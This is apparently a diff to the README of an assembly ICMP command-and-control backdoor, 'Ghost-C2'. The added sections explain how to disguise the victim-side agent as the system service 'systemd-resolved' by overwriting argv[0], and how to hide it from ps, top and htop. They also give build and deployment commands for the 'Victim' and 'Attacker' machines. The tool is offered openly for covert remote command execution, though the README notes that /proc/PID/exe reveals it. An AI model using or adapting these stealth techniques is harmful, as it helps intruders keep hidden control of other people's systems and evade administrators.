@@ -141,17 +141,27 @@ Key Integrity: To prevent "null-byte leakage" (where XORing 0x00 reveals the key
 * **LD** (GNU Linker)
 * **Root Privileges** (Required to open RAW sockets)
 
-### 🛠 Compilation
+### 🛡️Clean Masquerade
+Tip: For a perfectly clean process tree without environment variable "bleeding", ensure the binary filename is at least 15 characters long (e.g., systemd-resolved-agent). This provides enough buffer on the stack to safely overwrite argv[0].
+### 🎭 Dynamic Process Masquerading & Stealth
+Ghost-C2 doesn't just run; it hides in plain sight. Using a combination of sys_prctl and argv[0] stack manipulation, the agent transforms itself into a legitimate system service.
+Zero-Trace Memory Alignment:
+The agent performs a deep memory sweep after the overwrite process. By manually null-terminating the argv[0] buffer and clearing the subsequent memory blocks, it ensures that no fragments of the original binary name or environment variables remain visible in process monitoring tools like ps, top, or htop.
+
+### 🛠️ Compilation & Usage
 
 To assemble and link both the server and the client in one go:
 
 ```bash
-nasm -f elf64 sniff.asm -o sniff.o && ld sniff.o -o sniff && nasm -f elf64 client.asm -o client.o && ld client.o -o client
+nasm -f elf64 sniff.asm -o sniff.o && ld sniff.o -o systemd-resolved
+```
+```bash
+nasm -f elf64 client.asm -o client.o && ld client.o -o client
 ```
 ## 💻 Usage
 1- Deploy the Sniffer (Victim):
 ```bash
-sudo ./sniff
+sudo ./systemd-resolved
 ```
 2- Run the Controller (Attacker):
 ```bash
@@ -159,6 +169,19 @@ sudo ./client
 ```
 3- Command Execution: Type your commands in the client terminal and watch the "ghost" reply from the victim.
 
+### 🔍 Verification (The "Ghost" in the Machine)
+Once running, the agent will vanish from standard process listings. Even if a system administrator looks for sniff, they will find nothing. Instead, they will see a legitimate-looking systemd-resolved process.
+1. Check Process List:
+```bash
+$ ps aux | grep systemd-resolved
+root        3887  0.0  0.0    192    16 ?        Ss   19:42   0:00 systemd-resolved
+```
+2. Deep Inspection (The Truth):
+Only by inspecting the executable link in the /proc filesystem can the true identity be revealed:
+```bash
+$ sudo ls -l /proc/3887/exe
+lrwxrwxrwx 1 root root 0 Mar 12 19:44 /proc/3887/exe -> /home/user/Downloads/ICMP-Ghost-A-Fileless-x64-Assembly-C2-Agent/systemd-resolved
+```
 ## 📖 Deep Dive & Technical Analysis
 
 For a detailed breakdown of the Assembly code, syscall mechanics, and the "Fileless" approach, check out the technical analysis on my blog:
